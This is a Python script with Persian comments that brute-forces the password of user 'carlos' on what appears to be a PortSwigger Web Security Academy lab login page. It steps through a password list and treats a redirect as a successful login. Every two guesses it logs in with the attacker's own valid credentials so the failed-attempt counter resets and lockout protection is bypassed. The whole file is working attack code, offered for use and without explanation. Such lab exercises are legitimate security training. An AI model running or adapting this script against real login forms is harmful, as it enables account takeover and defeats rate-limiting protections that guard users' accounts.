import requests
import time

# ================== تنظیمات ==================
LOGIN_URL = "https://0a55006b0419e60f81fd48e60096009d.web-security-academy.net/login" # ← اینو با URL  خودت عوض کن

USERNAME = "carlos"          # یوزر هدف
GOOD_USER = "wiener"         # یوزر صحیح خودت
GOOD_PASS = "peter"          # پسورد صحیح خودت

# لیست پسوردها 
PASSWORD_LIST = "passwords.txt"

# بعد از هر چند تا تست بد، یک لاگین خوب انجام بده (برای جلوگیری از بلاک)
RESET_EVERY = 2              # بعد از هر ۲ تست، یک لاگین خوب
DELAY = 1                   # تأخیر بین درخواست‌ها (ثانیه) 
# =============================================

session = requests.Session()

def login(username, password):
    data = {
        "username": username,
        "password": password
    }
    response = session.post(LOGIN_URL, data=data, allow_redirects=False)
    
    if response.status_code == 302:  # ریدایرکت = لاگین موفق
        print(f"[+] SUCCESS: {username}:{password}")
        return True
    else:
        print(f"[-] Failed: {username}:{password} | Status: {response.status_code}")
        return False

# خواندن لیست پسوردها
with open(PASSWORD_LIST, "r", encoding="utf-8") as f:
    passwords = [line.strip() for line in f if line.strip()]

print(f"STARTING BRUTE_FORC WITH : {len(passwords)} پسورد...")

found = False
for i, pwd in enumerate(passwords, 1):
    # تست پسورد روی یوزر هدف
    print(f"\n[{i}/{len(passwords)}] Testing {USERNAME}:{pwd}")
    if login(USERNAME, pwd):
        found = True
        print(f"\n🎉 CORRECT PASSWORD FOUND : {pwd}")
        break
    
    # بعد از هر RESET_EVERY تست، یک لاگین خوب انجام بده
    if i % RESET_EVERY == 0:
        print(f"counter rest with right userpass")
        login(GOOD_USER, GOOD_PASS)
        time.sleep(DELAY)
    
    time.sleep(DELAY)  # جلوگیری از ارسال خیلی سریع

if not found:
    print("\nNOT FOUND ANY PASSWORD IN LIST")
print("DONE !")
